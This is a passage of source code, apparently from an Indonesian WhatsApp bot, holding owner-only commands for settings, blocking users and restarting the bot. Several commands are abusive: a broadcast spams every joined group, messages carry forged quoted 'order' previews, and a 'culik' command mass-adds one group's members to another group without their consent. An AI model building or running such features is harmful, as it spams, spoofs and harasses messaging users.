let getGroups = await atak.groupFetchAllParticipating()
let groupss = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anus = groupss.map(v => v.id)
if(!q) return setReply('teksnya?')
setReply(`Mengirim Broadcast Ke ${anus.length} Chat, Waktu Selesai ${anus.length * 0.5 } detik`)
let yesnih = [
{"buttonId": `${prefix}menu`,"buttonText": {"displayText": `ᴍᴇɴᴜ`},"type": "RESPONSE"},
{"buttonId": `SEWA BOT`,"buttonText": {"displayText": `sᴇᴡᴀ ʙᴏᴛ`},"type": "RESPONSE"}]
let teks = `*BROADCAST GROUP*\n\n${q}`
if (isImage || isQuotedImage) { //Image
let buff = await atak.downloadAndSaveMediaMessage(quoted)
for (let i of anus) {
await delay(1000)
await atak.sendMessage(i, {caption: teks, image: fs.readFileSync(buff)}, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 10000, status: 200, jpegThumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}})
}
fs.unlinkSync(buff)
} else  if (isVideo || isQuotedVideo) { //Video
let buff = await atak.downloadAndSaveMediaMessage(quoted)
for (let i of anus) {
await delay(1000)
await atak.sendMessage(i, {caption: teks, video: buff}, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 10000, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}})
}
fs.unlinkSync(buff)
} else if (isAudio || isQuotedAudio) { //Audio
let buff = await atak.downloadAndSaveMediaMessage(quoted)
for (let i of anus) {
await delay(1000)
await atak.sendMessage(i, {caption: teks, audio: fs.readFileSync(buff)}, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 10000, status: 200, thumbnail: thumb, surface: 200, message: q, orderTitle: q, sellerJid: '0@s.whatsapp.net'}}}})
}
fs.unlinkSync(buff)
} else {
for (let i of anus) {
await delay(1000)
await atak.sendButLoc(i, teks,fake,thumb, yesnih)
}
}
setReply(`Sukses Mengirim Broadcast Ke ${anus.length} Group`)
}
break
case 'getcaze':
case 'getcase':
try{
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if (!q) return setReply("*Mau nyari Case apa kak*") 
if(q.startsWith(prefix)) return setReply("Query tidak boleh menggunakan prefix")
let atak = await getCase(q)
setReply(atak)
} catch(err){
console.log(err)
setReply(`Case ${q} tidak di temukan`)
}
break
case 'leave':
if (!isRegist) return onlyRegist()
if (!isGroup) return onlyGroup() 
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
await atak.groupLeave(from)
break
case 'block':
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if (isGroup){
if (users){
await atak.updateBlockStatus(users, "block")
setReply(`Sukses block user`)
} else {
setReply("Silakan reply pesan atau tag atau input nomer yang mau di block")
}
} else if(!isGroup){
if(q){
var woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
if(woke.startsWith("08")) return setReply("Awali nomer dengan 62")
if(!woke.startsWith("62")) return setReply("Silakan reply pesan atau tag atau input nomer yang mau di block")
await atak.updateBlockStatus(woke, "block")
} else if(!q){
setReply("Masukan nomer yang ingin di block")
}
setReply(`Berhasil Block user ${woke.split("@")[0]}`)
}
break
case 'unblock':
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if (isGroup){
if (users){
await atak.updateBlockStatus(users, "unblock")
await setReply(`Sukses unblock user`)
} else if(!q){
setReply("Silakan reply pesan atau tag atau input nomer yang mau di block")
}
} else if(!isGroup){
if(q){
let woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
if(woke.startsWith("08")) return setReply("Awali nomer dengan 62")
if(!woke.startsWith("62")) return setReply("Silakan reply pesan atau tag atau input nomer yang mau di block")
await atak.updateBlockStatus(woke, "unblock")
setReply(`Sukses unblock ${woke}`)
} else if(!q){
setReply("Masukan nomer yang ingin di unblock")
}
}
break
case 'blockcmd':
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if (!q) return setReply(`Textnya mana cih\n\nContoh : ${prefix}blockcmd menu\nGituuuuuuu`)
if (checkblockcmd(q, listcmdblock)) return setReply(`Command tersebut sudah ada di database`)
addblockcmd(q,listcmdblock)         
setReply(`Berhasil memblokir command 「 *${q}* 」\nsilakan ketik ${prefix}listblockcmd untuk melihat\ndaftar command yang telah di block`)          
break                    
case 'unblockcmd':
try{
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner()
if(!q) return setReply("Textnya mana cih")
if (!checkblockcmd(q, listcmdblock)) return setReply(`Command tersebut tidak ada di database`)
deleteblockcmd(q, listcmdblock)        
setReply(`Berhasil unblock command 「 *${q}* 」`)
} catch (err) {
setReply("Bjirr error, keknya ada yang error")
}
break  
case 'autolevel':{
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
if (autoLevel) return setReply('Sudah aktif kak')
autoLevel = true
setReply("Sukses mengaktifkan auto level!");
} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
if (!autoLevel) return setReply('Sudah Mati')
autoLevel = false
setReply("Sukses mematikan auto level!");
} else if (!q) {
atak.sendButMessage(from, `MODE AUTO LEVEL`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}autolevel on`, buttonText: {displayText: On },type: 1},
{buttonId: `${prefix}autolevel off`, buttonText: { displayText: Off },type: 1}], setQuoted);
}
}
break;
case 'autorespon':
if (!isRegist) return onlyRegist() 
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
if (autorespon === true) return setReply('Udah aktif kak')
autorespon = true
let ih =`Mode auto respon telah aktif kak \nBot akan auto respon saat di chat`
setReply(ih) 
} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
if (autorespon === false) return setReply('Udah off kak')
autorespon = false
let eh =`Mode auto respon telah di matikan`
setReply(eh) 
}else if (!q) {
atak.sendButMessage(from, `MODE AUTO RESPON`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}autorespon on`, buttonText: {displayText: On },type: 1},
{buttonId: `${prefix}autorespon off`, buttonText: { displayText: Off },type: 1}], setQuoted);
}
break;
case 'autosticker':
if (!isRegist) return onlyRegist() 
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
if (autoSticker === true) return setReply('Udah aktif kak')
autoSticker = true
let ih =`Mode auto ${command} telah aktif kak`
setReply(ih) 
} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
if (autoSticker === false) return setReply('Udah off kak')
autoSticker = false
let eh =`Mode auto ${command} telah di matikan`
setReply(eh) 
}else if (!q) {
atak.sendButMessage(from, `MODE AUTO STICKER`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}autosticker on`, buttonText: {displayText: On },type: 1},
{buttonId: `${prefix}autosticker off`, buttonText: { displayText: Off },type: 1}], setQuoted);
}
break;
case 'autovn':
if (!isRegist) return onlyRegist() 
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
if (autovn === true) return setReply('Udah aktif kak')
autovn = true
let ih =`Mode auto ${command} telah aktif kak`
setReply(ih) 
} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
if (autovn === false) return setReply('Udah off kak')
autovn = false
let eh =`Mode auto ${command} telah di matikan`
setReply(eh) 
}else if (!q) {
atak.sendButMessage(from, `MODE AUTO VN`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}autovn on`, buttonText: {displayText: On },type: 1},
{buttonId: `${prefix}autovn off`, buttonText: { displayText: Off },type: 1}], setQuoted);
}
break
case 'orquoted':
if (!isRegist) return onlyRegist() 
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if ((args[0]) === 'true' ) {
if (orquoted === true) return setReply('Udah aktif kak')
orquoted = true
let ih =`Mode ${command} telah aktif kak`
setReply(ih) 
} else  if ((args[0]) === 'false' ) {
if (orquoted === false) return setReply('Udah off kak')
orquoted = false
let eh =`Mode ${command} telah di matikan`
setReply(eh) 
}else if (!q) {
atak.sendButMessage(from, `MODE AUTO QUOTED`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}orquoted true`, buttonText: { displayText: 'true' },type: 1},
{buttonId: `${prefix}orquoted false`, buttonText: { displayText: 'false' },type: 1}], setQuoted);
}
break
case 'autobutton':
if (!isRegist) return onlyRegist() 
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
if (autobutton === true) return setReply('Udah aktif kak')
autobutton = true
let ih =`Mode auto ${command} telah aktif kak`
setReply(ih) 
} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
if (autobutton === false) return setReply('Udah off kak')
autobutton = false
let eh =`Mode auto ${command} telah di matikan`
setReply(eh) 
}else if (!q) {
atak.sendButMessage(from, `MODE AUTO BUTTON`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}autobutton on`, buttonText: {displayText: On },type: 1},
{buttonId: `${prefix}autobutton off`, buttonText: { displayText: Off },type: 1}], setQuoted);
}
break
case 'culik':{
if (!isRegist) return onlyRegist()
if (!isOwner && !itsMe) return onlyOwner() 
if (args.length < 1) return reply('_*Masukin id grupnya tolol*_')
let mem = [];
await groupMembers.map( i => mem.push(i.id) )
await atak.groupParticipantsUpdate(q, mem, 'add')
setReply("Sukses")
}
break
case 'shutdown':
if (!isRegist) return onlyRegist()
if (!isOwner && !itsMe) return onlyOwner() 
await atak.sendMessage(from, {text: "_Shuting Down..._"})
await delay(3000)
await atak.sendMessage(from, {text: "_Succes_"})
exec(`pm2 stop index.js`)
return await atak.sendMessage(from, JSON.stringify(eval(process.exit())))
break
case 'restart':
if (!isRegist) return onlyRegist()
if (!isOwner && !itsMe) return onlyOwner() 
await setReply(`_Restarting ${botName}_`)
try{
await atak.sendMessage(from, {text: "_Succes_"})
await sleep(3000)
exec(`pm2 restart index.js`)
} catch (err) {
exec(`cd && node index`)
await sleep(4000)
setReply('Sukses')
}
break
case 'setprefix':
{
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
let teks =`SETTING PREFIX\n\nSilakan masukkan prefix\nOptions :\n=> multi\n=> nopref\n=> allpref`
if (q === 'multi'){
multi = true
nopref = false
setReply(`Berhasil mengubah prefix ke *「 ${q} 」*`)
} else if (q === 'nopref'){
multi = false
nopref = true
setReply(`Berhasil mengubah prefix ke *「 ${q} 」*`)
} else if (q === 'allpref'){
multi = false
nopref = false
allpref = true
setReply(`Berhasil mengubah prefix ke *「 ${q} 」*`)
} else if (!q) {
atak.sendButMessage(from, teks, fake, [
{buttonId: `${prefix}setprefix multi`, buttonText: {displayText: `ᴍᴜʟᴛɪ`},type: 1},
{buttonId: `${prefix}setprefix nopref`, buttonText: {displayText: `ɴᴏᴘʀᴇғ`},type: 1},
{buttonId: `${prefix}setprefix allpref`, buttonText: { displayText: `ᴀʟʟᴘʀᴇғ`},type: 1}]);
} else {
multi = false
nopref = false
prefa = `${q}`
setReply(`Berhasil anying mengubah prefix ke *「 ${q} 」*`)
} 
}
break
case 'setmenu':
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if ((args[0]) === 'lokasi2'|| (args[0]) === 'prolocation2' ){
setmenu = "location2"
await atak.sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
} else if ((args[0]) === 'image'|| (args[0]) === 'img' ){
setmenu = "image"
await atak.sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
} else if ((args[0]) === 'lokasi' ){
setmenu = "location"
await atak.sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
} else if ((args[0]) === 'katalog' ){
setmenu = "katalog"
await atak.sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
} else if ((args[0]) === 'image2'|| (args[0]) === 'img2' ){
setmenu = "image2"
await atak.sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
} else if ((args[0]) === 'document'){
setmenu = "document"
await atak.sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
} else if ((args[0]) === 'gif'){
setmenu = "gif"
await atak.sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
}  else if (!q) {
atak.sendButMessage(from, `SETTING MENU\n1.lokasi\n2.lokasi2\n3.img\n4.document\n5.gif`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}setmenu document`, buttonText: {displayText: `DOCUMENT`},type: 1},
{buttonId: `${prefix}setmenu image`, buttonText: {displayText: `IMAGE`},type: 1},
{buttonId: `${prefix}setmenu lokasi`, buttonText: { displayText: `LOCATION`},type: 1}],setQuoted);
} else {
setReply("Menu tidak di temukan om")
}
break
/*case 'settextmenu':
if (!isRegist) return onlyRegist() 
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if ((args[0]) === 'menu1' ){
textMenu = "menu1"
await atak.sendButMessage(from, `Berhasil mengubah tampilan text menu ke ${q}`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
} else if ((args[0]) === 'menu2' ){
textMenu = "menu2"
await atak.sendButMessage(from, `Berhasil mengubah tampilan text menu ke ${q}`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
} else if ((args[0]) === 'menu3'){
textMenu = "menu3"
await atak.sendButMessage(from, `Berhasil mengubah tampilan text menu ke ${q}`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
}  else if (!q) {
atak.sendButMessage(from, `SETTING TEXT MENU\n1.menu1\n2.menu2\n3.menu3`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}settextmenu menu1`, buttonText: { displayText: `MENU1`},type: 1},
{buttonId: `${prefix}settextmenu menu2`, buttonText: { displayText: `MENU2`},type: 1},
{buttonId: `${prefix}settextmenu menu3`, buttonText: { displayText: `MENU3`},type: 1}],setQuoted);
} else {
setReply("Text Menu tidak di temukan om")
}
break
case 'settextfitur':
if (!isRegist) return onlyRegist() 
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if ((args[0]) === 'fitur1' ){
textFitur = "fitur1"
await atak.sendButMessage(from, `Berhasil mengubah tampilan text fitur ke ${q}`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
} else if ((args[0]) === 'fitur2' ){
textFitur = "fitur2"
await atak.sendButMessage(from, `Berhasil mengubah tampilan text fitur ke ${q}`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
} else if ((args[0]) === 'fitur3'){
textFitur = "fitur3"
await atak.sendButMessage(from, `Berhasil mengubah tampilan text fitur ke ${q}`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
}  else if (!q) {
atak.sendButMessage(from, `SETTING TEXT FITUR\n1.fitur1\n2.fitur2\n3.fitur3`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}settextfitur fitur1`, buttonText: { displayText: `FITUR1`},type: 1},
{buttonId: `${prefix}settextfitur fitur2`, buttonText: { displayText: `FITUR2`},type: 1},
{buttonId: `${prefix}settextfitur fitur3`, buttonText: { displayText: `FITUR3`},type: 1}],setQuoted);
} else {
setReply("Text Fitur tidak di temukan om")
}
break*/
case 'setreply':{
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if ((args[0]) === 'web1'|| (args[0]) === 'situs1' ){
if(replyType === "web1") return setReply("Udah aktif")
replyType = "web1"
setReply(`Berhasil mengubah set reply ke ${q}`)
}  else if ((args[0]) === 'web2'|| (args[0]) === 'situs2' ){
if(replyType === "web2") return setReply("Udah aktif")
replyType = "web2"
setReply(`Berhasil mengubah set reply ke ${q}`)
}  else if ((args[0]) === 'web3'|| (args[0]) === 'situs3' ){
if(replyType === "web3") return setReply("Udah aktif")
replyType = "web3"
setReply(`Berhasil mengubah set reply ke ${q}`)
}  else if ((args[0]) === 'mess'){
if(replyType === "mess") return setReply("Udah aktif")
replyType = "mess"
setReply(`Berhasil mengubah set reply ke ${q}`)
} else if ((args[0]) === 'troli' ){
if(replyType === "troli") return setReply("Udah aktif")
replyType = "troli"
setReply(`Berhasil mengubah set reply ke ${q}`)
} else if ((args[0]) === 'troli2' ){
if(replyType === "troli2") return setReply("Udah aktif")
replyType = "troli2"
setReply(`Berhasil mengubah set reply ke ${q}`)
} else if (!q) {
atak.sendButMessage(from, `SETTING REPLY\n1. web1\n2. web2\n3. web3\n4. mess\n5. troli\n6. troli2`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}setreply web1`, buttonText: {displayText: `WEB1`},type: 1},
{buttonId: `${prefix}setreply web2`, buttonText: {displayText: `WEB2`},type: 1},
{buttonId: `${prefix}setreply web3`, buttonText: { displayText: `WEB3`},type: 1}]);
} else {
setReply("Set Reply Tidak Di Temukan")
}
}
break
case 'setquoted':
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if ((args[0]) === 'ftoko'|| (args[0]) === 'product' ){
if(Qoted === "ftoko") return setReply("Udah aktif")
Qoted = "ftoko"
await atak.sendMessage(from, {text: `Berhasil mengubah quoted ke ${q}`}, {quoted: ftoko})
} else if ((args[0]) === 'fkontak' ){
if(Qoted === "fkontak") return setReply("Udah aktif")
Qoted = "fkontak"
await atak.sendMessage(from, {text: `Berhasil mengubah quoted ke ${q}`}, {quoted: fkontak})
} else if ((args[0]) === 'ftext'){
if(Qoted === "ftext") return setReply("Udah aktif")
Qoted = "ftext"
await atak.sendMessage(from, {text: `Berhasil mengubah quoted ke ${q}`}, {quoted: ftext})
} else if ((args[0]) === 'ftroli'){
if(Qoted === "ftroli") return setReply("Udah aktif")
Qoted = "ftroli"
await atak.sendMessage(from, {text: `Berhasil mengubah quoted ke ${q}`}, {quoted: ftroli})
} else if ((args[0]) === 'floc'){
if(Qoted === "floc") return setReply("Udah aktif")
Qoted = "floc"
await atak.sendMessage(from, {text: `Berhasil mengubah quoted ke ${q}`}, {quoted: floc})
} else if ((args[0]) === 'fimage'){
if(Qoted === "fimage") return setReply("Udah aktif")
Qoted = "fimage"
await atak.sendMessage(from, {text: `Berhasil mengubah quoted ke ${q}`}, {quoted: fimage})
} else if ((args[0]) === 'fdoc' ){
if(Qoted === "fdoc") return setReply("Udah aktif")
Qoted = "fdoc"
await atak.sendMessage(from, {text: `Berhasil mengubah quoted ke ${q}`}, {quoted: fdoc})
} else if ((args[0]) === 'fvid'){
if(Qoted === "fvid") return setReply("Udah aktif")
Qoted = "fvid"
await atak.sendMessage(from, {text: `Berhasil mengubah quoted ke ${q}`}, {quoted: fvid})
} else if ((args[0]) === 'fgc'){
if(Qoted === "fgc") return setReply("Udah aktif")
Qoted = "fgc"
await atak.sendMessage(from, {text: `Berhasil mengubah quoted ke ${q}`}, {quoted: fgc})
} else if ((args[0]) === 'fgif'){
if(Qoted === "fgif") return setReply("Udah aktif")
Qoted = "fgif"
await atak.sendMessage(from, {text: `Berhasil mengubah quoted ke ${q}`}, {quoted: fgif})
}else if ((args[0]) === 'fvn'){
if(Qoted === "fvn") return setReply("Udah aktif")
Qoted = "fvn"
await atak.sendMessage(from, {text: `Berhasil mengubah quoted ke ${q}`}, {quoted: fvn})
} else if ((args[0]) === 'ridho'){
if(Qoted === "ridho") return setReply("Udah aktif")
Qoted = "ridho"
await atak.sendMessage(from, {text: `Berhasil mengubah quoted ke ${q}`}, {quoted: ridho})
} else if (!q) {
atak.sendButMessage(from, `SETTING QUOTED`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}setquoted ftoko`, buttonText: {displayText: `ғᴛᴏᴋᴏ`},type: 1},
{buttonId: `${prefix}setquoted fkontak`, buttonText: {displayText: `ғᴋᴏɴᴛᴀᴋ`},type: 1},
{buttonId: `${prefix}setquoted ftext`, buttonText: { displayText: `ғᴛᴇxᴛ`},type: 1}],setQuoted);
} else {
let teks =`Quoted yang kamu masukan salah\nSilakan pilih salah satu quoted berikut:\n1.ftoko\n2.fkontak\n3.ftext\n4.ftroli\n5.floc\n6.fimage\n7.fdoc\n8.fvid\n9.fgc\n10.fgif\n11.fvn\n12.ridho`
setReply(teks)
}
break
case 'setnamebot':
case 'setnamabot':
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
setReply(`Berhasil mengubah nama bot ke ${q}`)
botName = `${q}`
break
case 'setppbot':
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if (isImage || isQuotedImage) {
var media = await atak.downloadAndSaveMediaMessage(quoted)
var data =  await atak.updateProfilePicture(botNumber, { url: media })
fs.unlinkSync(media)
setReply(`Sukses`)
} else {
setReply(`Kirim/balas gambar dengan caption ${command} untuk mengubah foto profil bot`)
}
break
case 'setbio':   
{
if (!isRegist) return onlyRegist()
if (!isOwner && !itsMe) return setReply("Khusus Owner")
if (!q) return setReply(`Kirim perintah ${prefix+command} nama\n\nContoh : ${command} Paijo`)
await atak.setStatus(q)
await setReply(`Berhasil mengganti status bio ke *${q}*`)
}
break
case 'setgif':{
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if(isVideo || isQuotedVideo){
let delb = await atak.downloadAndSaveMediaMessage(quoted)
await fse.copy(delb,`./media/video/video.mp4`)
fs.unlinkSync(delb)
setReply(`Berhasil mengubah thumbnail`)
} else {
setReply(`Kirim gambar dengan caption ${prefix}setgif`);
}
}
break
case 'setexif':
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
var namaPack = q.split('|')[0] ? q.split('|')[0] : q
var authorPack = q.split('|')[1] ? q.split('|')[1] : ''
exif.create(namaPack, authorPack)
setReply(`Sukses membuat exif`)
break
case 'console':{
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
if (Console === true) return setReply('Udah aktif kak')
Console = true
let ih =`Tampilan console telah di aktifkan`
setReply(ih)
} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
if (Console === false) return setReply('Udah off kak')
Console = false
let eh =`Mode auto respon telah di matikan`
setReply(eh)
}else if (!q) {
atak.sendButMessage(from, `MODE AUTOREAD`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}console on`, buttonText: {displayText: On },type: 1},
{buttonId: `${prefix}console off`, buttonText: { displayText: Off },type: 1}], setQuoted);
}
}
break
case 'public':
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if (publik) return setReply('Udah di mode publick kak')
publik = true
let bab =`Mode public aktif kak`
setReply(bab)
break
case 'self':
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner()
if (publik == false) return setReply('Udah di mode self kak')
publik = false
let breh =`Mode self aktif kak`
setReply(breh)
break
case 'setwelcome':
if (!isRegist) return onlyRegist() 
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if ((args[0]) === 'type1' ) {
if(setwelcome === "type1") return setReply("Udah aktif")
setwelcome = "type1"
setReply(`Berhasil mengubah welcome ke 「 ${q} 」`)
} else if ((args[0]) === 'type2' ) {
if(setwelcome === "type2") return setReply("Udah aktif")
setwelcome = "type2"
setReply(`Berhasil mengubah welcome ke 「 ${q} 」`)
} else if ((args[0]) === 'type3' ) {
if(setwelcome === "type3") return setReply("Udah aktif")
setwelcome = "type3"
setReply(`Berhasil mengubah welcome ke 「 ${q} 」`)
} else if (!q) {
atak.sendButMessage(from, `SETTING WELCOME`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}setwelcome type1`, buttonText: {displayText: `Type1`},type: 1},
{buttonId: `${prefix}setwelcome type2`, buttonText: {displayText: `Type2`},type: 1},
{buttonId: `${prefix}setwelcome type3`, buttonText: { displayText: `Type3`},type: 1}],setQuoted);
} else {
let teks =`Query tidak diremukan\nSilakan pilih salah satu:\n1.type1\n2.type2\n3.type3`
setReply(teks)
}
break
case 'setdocument':
case 'setdoc':
if (!isRegist) return onlyRegist() 
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if ((args[0]) === 'zip' ) {
if(docType === "zip") return setReply("Udah aktif")
docType = "zip"
setReply(`Berhasil mengubah docmunet ke 「 ${q} 」`)
} else if ((args[0]) === 'pdf' ) {
if(docType === "pdf") return setReply("Udah aktif")
docType = "pdf"
setReply(`Berhasil mengubah docmunet ke 「 ${q} 」`)
} else if ((args[0]) === 'pptx' ) {
if(docType === "pptx") return setReply("Udah aktif")
docType = "pptx"
setReply(`Berhasil mengubah docmunet ke 「 ${q} 」`)
} else if ((args[0]) === 'xlsx' ) {
if(docType === "xlsx") return setReply("Udah aktif")
docType = "xlsx"
setReply(`Berhasil mengubah docmunet ke 「 ${q} 」`)
} else if ((args[0]) === 'docx' ) {
if(docType === "docx") return setReply("Udah aktif")
docType = "docx"
setReply(`Berhasil mengubah docmunet ke 「 ${q} 」`)
} else if (!q) {
atak.sendButMessage(from, `SETTING DOCUMENT`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}setdocument pdf`, buttonText: {displayText: `Pdf`},type: 1},
{buttonId: `${prefix}setdocument xlsx`, buttonText: {displayText: `Xlsx`},type: 1},
{buttonId: `${prefix}setdocument pptx`, buttonText: { displayText: `Pptx`},type: 1}],setQuoted);
} else {
let teks =`Document tidak diremukan\nSilakan pilih salah satu:\n1.zip\n2.pdf\n3.pptx\n4.xlsx\n5.docx`
setReply(teks)
}
break
case 'setfake':
if (!isRegist) return onlyRegist() 
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if (!q) return reply(`Teks?`)
if ((args[0]) === `${q}` ) {
fake = `${q}`
setReply(`Berhasil mengubah text fake ke 「 ${q} 」`)
}
break
case 'settextreply':
if (!isRegist) return onlyRegist() 
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if (!q) return reply(`Teks?`)
if ((args[0]) === `${q}` ) {
textreply = `${q}`
setReply(`Berhasil mengubah text reply ke 「 ${q} 」`)
}
break
case 'setnamaowner':
